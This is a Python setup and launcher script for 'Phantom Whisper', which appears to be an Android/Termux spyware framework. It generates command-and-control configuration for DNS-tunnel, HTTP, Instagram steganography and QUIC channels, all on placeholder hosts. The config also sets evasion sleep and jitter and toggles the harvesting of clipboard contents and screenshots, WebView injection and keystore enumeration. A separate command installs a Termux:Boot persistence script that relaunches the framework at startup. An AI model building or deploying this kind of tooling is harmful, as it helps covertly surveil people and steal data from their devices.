#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║   ██████╗ ██╗    ██╗     ██████╗ ██████╗ ███╗   ███╗██████╗  █████╗     ║
║   ██╔══██╗██║    ██║    ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██╔══██╗    ║
║   ██████╔╝██║ █╗ ██║    ██║     ██║   ██║██╔████╔██║██████╔╝███████║    ║
║   ██╔═══╝ ██║███╗██║    ██║     ██║   ██║██║╚██╔╝██║██╔══██╗██╔══██║    ║
║   ██║     ╚███╔███╔╝    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║  ██║██║  ██║    ║
║   ╚═╝      ╚══╝╚══╝      ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ║
║                                                                           ║
║            Phantom Whisper — Companion Setup & Launcher                  ║
║         Environment Auto-Config + Dependency Manager + C2 Tools          ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝

Usage:
    python pw_companion.py [command]

Commands:
    setup       Auto-install all dependencies + configure environment
    deps        Check and install missing Python packages
    c2          Interactive C2 configuration generator
    run         Launch Phantom Whisper with optimal settings
    service     Create Termux boot service for persistence
    doctor      Full system diagnostics report
"""

import sys
import os
import shutil
import subprocess
import json
from pathlib import Path
from typing import List, Dict, Optional, Tuple

# ─── Color Codes ──────────────────────────────────────────────────────────────
C = {
    "M": "\033[95m",   # Magenta
    "C": "\033[96m",   # Cyan
    "G": "\033[92m",   # Green
    "Y": "\033[93m",   # Yellow
    "R": "\033[91m",   # Red
    "B": "\033[94m",   # Blue
    "N": "\033[0m",    # Reset
    "BO": "\033[1m",   # Bold
}

PW_DIR = Path.home() / ".phantom"
PW_DIR.mkdir(exist_ok=True)


def banner() -> None:
    print(f"""{C['M']}{C['BO']}
    ╔══════════════════════════════════════════════════════════════╗
    ║  ██████╗ ██╗    ██╗     ██████╗ ██████╗ ███╗   ███╗██████╗ ║
    ║  ██╔══██╗██║    ██║    ██╔════╝██╔═══██╗████╗ ████║██╔══██╗║
    ║  ██████╔╝██║ █╗ ██║    ██║     ██║   ██║██╔████╔██║██████╔╝║
    ║  ██╔═══╝ ██║███╗██║    ██║     ██║   ██║██║╚██╔╝██║██╔══██╗║
    ║  ██║     ╚███╔███╔╝    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║  ██║║
    ║  ╚═╝      ╚══╝╚══╝      ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝║
    ║                                                              ║
    ║       {C['C']}Companion Setup & Launcher - v1.0.0{C['M']}              ║
    ╚══════════════════════════════════════════════════════════════╝{C['N']}
    """)


def check_deps() -> Dict[str, bool]:
    """Check all required dependencies, return status map."""
    deps = {
        "python": shutil.which("python3") is not None,
        "pip": shutil.which("pip3") is not None or shutil.which("pip") is not None,
        "git": shutil.which("git") is not None,
        "termux": "com.termux" in os.environ.get("PREFIX", ""),
    }

    # Check Python packages
    pip_pkgs = {
        "rich": False,
        "requests": False,
        "cryptography": False,
        "dnspython": False,
    }

    for pkg in pip_pkgs:
        try:
            __import__(pkg.replace("-", "_").replace("dnspython", "dns"))
            pip_pkgs[pkg] = True
        except ImportError:
            pip_pkgs[pkg] = False

    return {**deps, **pip_pkgs}


def doctor() -> None:
    """Full system diagnostic."""
    banner()
    deps = check_deps()

    print(f"\n{C['BO']}{C['B']}═══ SYSTEM DIAGNOSTIC REPORT ═══{C['N']}\n")

    # System info
    print(f"{C['C']}[*]{C['N']} Python:        {sys.version.split()[0]}")
    print(f"{C['C']}[*]{C['N']} Platform:      {sys.platform}")
    print(f"{C['C']}[*]{C['N']} PW Directory:  {PW_DIR}")
    print(f"{C['C']}[*]{C['N']} Script dir:    {Path.cwd()}")
    print()

    # Core tools
    for name, ok in deps.items():
        if name in ("rich", "requests", "cryptography", "dnspython"):
            continue
        icon = f"{C['G']}✓{C['N']}" if ok else f"{C['R']}✗{C['N']}"
        print(f"  {icon} {name}")

    print()

    # Python packages
    print(f"{C['BO']}{C['Y']}─── Python Packages ───{C['N']}")
    for name, ok in deps.items():
        if name not in ("rich", "requests", "cryptography", "dnspython"):
            continue
        icon = f"{C['G']}✓{C['N']}" if ok else f"{C['R']}✗{C['N']}"
        print(f"  {icon} {name}")

    # Phantom Whisper file
    pw_file = Path.cwd() / "phantom_whisper.py"
    if pw_file.exists():
        size = pw_file.stat().st_size
        print(f"\n  {C['G']}✓{C['N']} phantom_whisper.py [{size:,} bytes]")
    else:
        print(f"\n  {C['R']}✗{C['N']} phantom_whisper.py NOT FOUND in current dir")

    # Summary
    missing = [k for k, v in deps.items() if not v]
    if missing:
        print(f"\n{C['Y']}[!] Missing: {', '.join(missing)}{C['N']}")
    else:
        print(f"\n{C['G']}[✓] All dependencies satisfied.{C['N']}")


def install_deps() -> None:
    """Install all missing Python packages."""
    deps = check_deps()
    missing = [k for k, v in deps.items() if not v and k in ("rich", "requests", "cryptography", "dnspython")]

    if not missing:
        print(f"{C['G']}[✓] All Python packages already installed.{C['N']}")
        return

    pkg_map = {
        "rich": "rich",
        "requests": "requests",
        "cryptography": "cryptography",
        "dnspython": "dnspython",
    }

    to_install = [pkg_map[m] for m in missing]
    print(f"{C['Y']}[*] Installing: {' '.join(to_install)}{C['N']}")

    pip = "pip3" if shutil.which("pip3") else "pip"
    try:
        result = subprocess.run(
            [pip, "install", "--quiet"] + to_install,
            capture_output=True, text=True, timeout=120
        )
        if result.returncode == 0:
            print(f"{C['G']}[✓] All packages installed successfully.{C['N']}")
        else:
            print(f"{C['R']}[✗] Install error:{C['N']} {result.stderr[:200]}")
    except Exception as e:
        print(f"{C['R']}[!] Exception during install: {e}{C['N']}")


def setup_env() -> None:
    """Full environment setup."""
    banner()
    print(f"\n{C['BO']}{C['B']}═══ ENVIRONMENT SETUP ═══{C['N']}\n")

    # Step 1: Install deps
    print(f"{C['Y']}[1/4]{C['N']} Installing Python packages...")
    install_deps()

    # Step 2: Create config directory
    print(f"\n{C['Y']}[2/4]{C['N']} Creating config directory...")
    PW_DIR.mkdir(exist_ok=True)
    print(f"  {C['G']}✓{C['N']} {PW_DIR}")

    # Step 3: Generate default C2 config
    print(f"\n{C['Y']}[3/4]{C['N']} Writing default C2 configuration...")
    c2_config = {
        "version": "1.0.0",
        "c2": {
            "dns_tunnel": "c2.example.com",
            "http_fallback": "https://cdn.example.com/assets",
            "social_stego": "instagram.com/phantom_drop",
            "quic_server": "quic.example.com:443"
        },
        "encryption": {
            "kdf_iterations": 600000,
            "algorithm": "PBKDF2-HMAC-SHA256 + Fernet(AES-128-CBC)"
        },
        "evasion": {
            "adaptive_sleep": True,
            "min_sleep_sec": 30,
            "max_sleep_sec": 300,
            "jitter_percent": 25
        },
        "harvesting": {
            "clipboard": True,
            "screenshot_ocr": True,
            "webview_inject": False,
            "keystore_enum": False
        }
    }
    config_path = PW_DIR / "c2_config.json"
    config_path.write_text(json.dumps(c2_config, indent=2))
    print(f"  {C['G']}✓{C['N']} {config_path}")

    # Step 4: Verify
    print(f"\n{C['Y']}[4/4]{C['N']} Running verification...")
    pw_file = Path.cwd() / "phantom_whisper.py"
    if pw_file.exists():
        print(f"  {C['G']}✓{C['N']} Phantom Whisper core found")
        print(f"  {C['C']}📄{C['N']} Size: {pw_file.stat().st_size:,} bytes")
    else:
        print(f"  {C['R']}✗{C['N']} phantom_whisper.py not in current directory")
        print(f"  {C['Y']}  Run this script from the Phantom-Whisper directory{C['N']}")

    print(f"\n{C['G']}{C['BO']}[✓] Setup complete! Run with: python pw_companion.py run{C['N']}")


def generate_c2() -> None:
    """Interactive C2 configuration generator."""
    banner()
    print(f"\n{C['BO']}{C['B']}═══ C2 CONFIGURATION GENERATOR ═══{C['N']}\n")

    config = {}
    try:
        config["dns_tunnel"] = input(f"  {C['C']}[?]{C['N']} DNS tunnel domain [{C['Y']}c2.example.com{C['N']}]: ").strip() or "c2.example.com"
        config["http_fallback"] = input(f"  {C['C']}[?]{C['N']} HTTP fallback URL [{C['Y']}https://cdn.example.com/assets{C['N']}]: ").strip() or "https://cdn.example.com/assets"
        config["social_stego"] = input(f"  {C['C']}[?]{C['N']} Social stego account [{C['Y']}instagram.com/phantom_drop{C['N']}]: ").strip() or "instagram.com/phantom_drop"
        config["quic_server"] = input(f"  {C['C']}[?]{C['N']} QUIC server [{C['Y']}quic.example.com:443{C['N']}]: ").strip() or "quic.example.com:443"
    except (EOFError, KeyboardInterrupt):
        print(f"\n{C['Y']}[!] Cancelled.{C['N']}")
        return

    c2_config = {
        "version": "1.0.0",
        "c2": config,
        "encryption": {
            "kdf_iterations": 600000,
            "algorithm": "PBKDF2-HMAC-SHA256 + Fernet(AES-128-CBC)"
        },
        "evasion": {
            "adaptive_sleep": True,
            "min_sleep_sec": 30,
            "max_sleep_sec": 300,
            "jitter_percent": 25
        },
        "harvesting": {
            "clipboard": True,
            "screenshot_ocr": True,
            "webview_inject": False,
            "keystore_enum": False
        }
    }

    config_path = PW_DIR / "c2_config.json"
    config_path.write_text(json.dumps(c2_config, indent=2))
    print(f"\n{C['G']}[✓] C2 config saved to {config_path}{C['N']}")


def setup_service() -> None:
    """Create Termux boot service for persistence."""
    banner()
    print(f"\n{C['BO']}{C['B']}═══ TERMUX BOOT SERVICE SETUP ═══{C['N']}")

    termux_home = Path.home()
    boot_dir = termux_home / ".termux" / "boot"
    service_path = boot_dir / "phantom_whisper.sh"

    script_content = """#!/data/data/com.termux/files/usr/bin/bash
# Phantom Whisper - Auto-start service
# Installed by pw_companion.py

cd ~/Phantom-Whisper
python phantom_whisper.py &
"""

    try:
        boot_dir.mkdir(parents=True, exist_ok=True)
        service_path.write_text(script_content)
        service_path.chmod(0o755)
        print(f"\n  {C['G']}✓{C['N']} Service script created: {service_path}")
        print(f"\n  {C['Y']}[!] Requires Termux:Boot addon installed.{C['N']}")
        print(f"  {C['Y']}[!] Restart Termux or run:{C['N']}")
        print(f"  {C['C']}     bash {service_path}{C['N']}")
    except Exception as e:
        print(f"\n  {C['R']}[✗] Failed: {e}{C['N']}")


def run_pw() -> None:
    """Launch Phantom Whisper with optimal settings."""
    banner()
    pw_file = Path.cwd() / "phantom_whisper.py"
    if not pw_file.exists():
        alt_path = Path.home() / "Phantom-Whisper" / "phantom_whisper.py"
        if alt_path.exists():
            os.chdir(str(alt_path.parent))
            pw_file = alt_path
        else:
            print(f"{C['R']}[!] phantom_whisper.py not found!{C['N']}")
            print(f"{C['Y']}    Checked: {pw_file}{C['N']}")
            print(f"{C['Y']}    Checked: {alt_path}{C['N']}")
            return

    print(f"{C['G']}[*] Launching Phantom Whisper...{C['N']}\n")
    try:
        os.execvp("python3", ["python3", str(pw_file)])
    except FileNotFoundError:
        os.execvp("python", ["python", str(pw_file)])
    except Exception as e:
        print(f"{C['R']}[!] Launch failed: {e}{C['N']}")


def help_menu() -> None:
    """Display help."""
    banner()
    print(f"""
{C['BO']}{C['C']}Usage:{C['N']}
    python pw_companion.py {C['Y']}<command>{C['N']}

{C['BO']}{C['C']}Commands:{C['N']}
  {C['G']}setup{C['N']}     Auto-install deps + generate config + verify env
  {C['G']}deps{C['N']}      Check and install missing Python packages only
  {C['G']}c2{C['N']}        Interactive C2 server configuration generator
  {C['G']}run{C['N']}       Launch Phantom Whisper main framework
  {C['G']}service{C['N']}   Create Termux:Boot autostart service script
  {C['G']}doctor{C['N']}    Full system diagnostic + dependency report
  {C['G']}help{C['N']}      Show this help menu

{C['BO']}{C['C']}Examples:{C['N']}
  python pw_companion.py setup     # Full first-time setup
  python pw_companion.py run       # Fire up Phantom Whisper
  python pw_companion.py doctor    # Check everything

{C['C']}✨ Phantom Whisper — Companion System{C['N']}
""")


def main():
    if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help", "help"):
        help_menu()
        return

    cmd = sys.argv[1].lower()

    commands = {
        "setup": setup_env,
        "deps": install_deps,
        "c2": generate_c2,
        "run": run_pw,
        "service": setup_service,
        "doctor": doctor,
    }

    if cmd in commands:
        commands[cmd]()
    else:
        print(f"{C['R']}[!] Unknown command: {cmd}{C['N']}")
        help_menu()


if __name__ == "__main__":
    main()
